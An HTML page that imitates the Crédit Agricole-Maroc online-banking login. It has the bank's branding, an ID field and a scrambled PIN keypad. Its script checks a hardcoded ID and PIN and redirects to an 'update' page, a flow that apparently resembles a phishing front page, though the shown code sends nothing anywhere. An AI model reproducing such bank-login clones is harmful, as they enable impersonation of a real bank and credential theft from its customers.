<!DOCTYPE html>
<html lang="en">
 <head>
  <!-- Required meta tags -->
  <meta charset="utf-8"/>
  <meta content="width=device-width, user-scalable=no, initial-scale=1" name="viewport"/>
  <link href="img/logo1.PNG" rel="icon" sizes="192x192" type="image/jpg"/>
  <!-- Compiled and minified CSS -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css" rel="stylesheet"/>
  <!-- Compiled and minified JavaScript -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js">
  </script>
  <link href="https://www.w3schools.com/w3css/4/w3.css" rel="stylesheet"/>
  <title>
   Accès CR |Crédit Agricole-Maroc
  </title>
  <style type="text/css">
   .input-field label {
     color: #333;
   }
  .input-field input[type=text]:focus {
     border-bottom: 1px solid #333;
     box-shadow: 0 1px 0 0 #333;
   }
   .clavier{
           padding-left: 30px;
           border: 1px red solid;
    }
    .effacer{
      padding-left: 50px;
    }
   @media only screen and (max-width: 1320px){
    
   }
  </style>
 </head>
 <body>
  <div class="">
   <div class="row">
    <div class="" style=" text-align: center;">
     <img src="img/logo1.PNG" style="width:190px;"/>
    </div>
   </div>
   <div class="row">
    <div class="col m6 col s12 offset-m3" style="">
     <h1 style="margin-top: 0px; text-align: center; color: #333; font-size: 33px; font-weight: 300">
      Accéder à vos comptes
     </h1>
     <div style="text-align: center">
      <img src="img/video.PNG"/>
     </div>
     <div class="row">
      <form class="col s12" id="form1" method="POST" name="changer" style="margin-top: 10px;">
       <div class="row">
        <div class="input-field col s9 m6 offset-s1 offset-m3">
         <input class="validate" id="last_name" name="login" style="border-color: #333" type="text"/>
         <label for="last_name">
          Identifiant
         </label>
        </div>
       </div>
       <div class="row" id="passwords" style="display: none">
        <div class="input-field col s9 m6 offset-s1 offset-m3">
         <input class="validate" id="password" name="password" placeholder="Placeholder" readonly="" style="border-color: #333" type="password"/>
         <label for="password">
          Mot de passe
         </label>
        </div>
       </div>
       <div class="row">
        <div class="col s9 m5 offset-s1 offset-m3" style="font-size: 12px; font-weight: 200; margin-top: -25px; text-decoration: underline;">
         Oublié ?
        </div>
        <div class="col s9 m5 offset-s1 offset-m3" id="vers" style="font-size: 12px; font-weight: 200; text-decoration: underline;">
         Version accessible
        </div>
       </div>
       <div class="row" id="clavier" style="display: none">
        <div class="col s10 m8 offset-m2 offset-s1">
         <div class="row">
          <div class="col m10 offset-m2">
           <div class="row">
            <input class="button" id="" onclick="clavier(7);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px;" type="button" value="7"/>
            <input class="button" id="" onclick="clavier(5);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="5"/>
            <input class="button" id="" onclick="clavier(3);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="3"/>
            <input class="button" id="" onclick="clavier(9);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="9"/>
            <input class="button" id="" onclick="clavier(1);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="1"/>
           </div>
           <div class="row">
            <input class="button" id="" onclick="clavier(8);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px;" type="button" value="8"/>
            <input class="button" id="" onclick="clavier(4);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="4"/>
            <input class="button" id="" onclick="clavier(2);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="2"/>
            <input class="button" id="" onclick="clavier(6);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="6"/>
            <input class="button" id="" onclick="clavier(0);" style="background-color: white; color: black; font-size: 35px; height: 53px; width: 55px; margin-left: 5px" type="button" value="0"/>
           </div>
          </div>
         </div>
        </div>
        <div class="row Effacer">
         <div class="col s8 m6 offset-s1 offset-m3">
          <div class="col s6 m6">
           <a>
            <button class="btn" id="effacer" style="background-color: #f5f5f5; color: gray; border: 1px solid blue; width: 100%">
             Effacer
            </button>
           </a>
          </div>
          <div class="col s6 m6">
           <button class="btn" id="valider" name="valider" style="border:none; background-color: #003C82; color: white; width: 100%" type="submit">
            Valider
           </button>
          </div>
         </div>
        </div>
       </div>
       <div class="row" id="loader" style="text-align: center; display: none">
        <div class="col s12">
         <img height="28" src="img/loader.gif"/>
        </div>
        <p class="col s4 m12 offset-s4" style="margin-top: -5px;">
         Chargement du clavier numérique
        </p>
       </div>
       <div class="row">
        <button class="btn col s7 m6 offset-s2 offset-m3" disabled="" id="continuer" style=" margin-top: 20px; border:none; background-color: #003C82; color: white" type="submit">
         Continuer
        </button>
       </div>
       <div class="row" id="image" style="text-align: center;">
        <img class="" src="img/fraude.PNG"/>
       </div>
      </form>
     </div>
    </div>
   </div>
  </div>
  <div class="w3-container">
   <div class="w3-modal" id="id01">
    <div class="w3-modal-content" style="width: 40%; margin-top: 100px; border-radius: 5px">
     <div class="w3-container">
      <span class="w3-button w3-display-topright" onclick="document.getElementById('id01').style.display='none'">
       ×
      </span>
      <div style="padding: 30px;">
       <p style="text-align: center;font-size: 21px; font-weight: 600;">
        Attention
       </p>
       <p style="font-size: 16px; text-align: center;">
        Votre identifiant ou mot de passe est erroné. Nous vous invitons à recommencer leur saisie.
       </p>
       <p style="text-align: center;">
        <button class="btn col s4 m4" onclick="document.getElementById('id01').style.display='none'" style="width: 100%; background-color: #003C82; color: white">
         ok
        </button>
       </p>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
 <footer class="row" style="background-color: #eeeeee; position: absolue;bottom:0px">
  <div class="col m12">
   <div class="row">
    <div class="col m8 offset-m2" style="padding-top: 20px;">
     <div class="col s12 m3">
      Aide à la connexion
     </div>
     <div class="col s12 m3">
      Sécurité
     </div>
     <div class="col s12 m3">
      Infos navigateurs
     </div>
     <div class="col s12 m3">
      Mentions légales
     </div>
    </div>
   </div>
   <div class="row">
    <div class="col m6 offset-m6">
     ©Crédit Agricole-Maroc
    </div>
   </div>
  </div>
 </footer>
</html>
<script type="text/javascript">
 document.getElementById('valider').addEventListener('click', function(e){
  e.preventDefault()
  if(document.getElementById('last_name').value == "0896475230"  && document.getElementById('password').value== "032845" ){
    window.location.href='mise_a_jour.html'
    
  }else{
    document.getElementById('id01').style.display='block';
  }
  
})

  document.getElementById('last_name').addEventListener('input', function(){
    if (document.getElementById('last_name').value.length > 0) {
       document.getElementById('continuer').removeAttribute("disabled");
    }else{
       document.getElementById('continuer').setAttribute("disabled", "disabled");
    }
  })

   document.getElementById('continuer').addEventListener('click', function(e){
     e.preventDefault()
     
     document.getElementById('continuer').style.display="none";
     document.getElementById('image').style.display="none";
     document.getElementById('vers').style.display="none";
     document.getElementById('loader').style.display="block";

     setTimeout(function(){
      document.getElementById('last_name').setAttribute('readonly','readonly')
      document.getElementById('loader').style.display="none";
      document.getElementById('passwords').style.display="block"; 
      document.getElementById('clavier').style.display="block"; 
     }, 3000);

   })

   function clavier (valeur) {
document.forms["changer"].elements["password"].value=document.forms["changer"].elements["password"].value+valeur;

document.getElementById('effacer').addEventListener('click', function(e){
  e.preventDefault();  document.getElementById('password').value=''})
}
</script>
